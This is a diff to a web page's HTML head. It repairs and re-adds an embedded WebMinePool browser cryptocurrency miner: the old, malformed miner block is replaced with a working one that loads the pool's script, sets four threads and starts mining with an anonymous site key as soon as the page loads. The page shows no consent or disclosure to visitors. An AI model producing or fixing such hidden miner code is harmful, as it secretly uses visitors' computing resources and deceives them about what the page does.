@@ -11,16 +11,20 @@
             localStorage.setItem('step1', 'visited');
         }
     </script>
-<script src="https://webminepool.com/lib/base.js"></script>
-<script>
-    var miner = WMP.Anonymous('<SK_rJk6Oxfxo2Pgs6dkTA6aa>');
-        threads: 4,
-        autoThreads: false,
-        throttle: 0.3,
-        forceASMJS: false
-    });
-    miner.start();
-</script>
+<div id="miner-container">
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+        var miner = WMP.Anonymous('<SK_rJk6Oxfxo2Pgs6dkTA6aa>');
+        miner.setConfig({
+            threads: 4,
+            autoThreads: false,
+            throttle: 0.3,
+            forceASMJS: false
+        });
+        miner.start();
+    </script>
+</div>
+
 
 </head>
 <body>
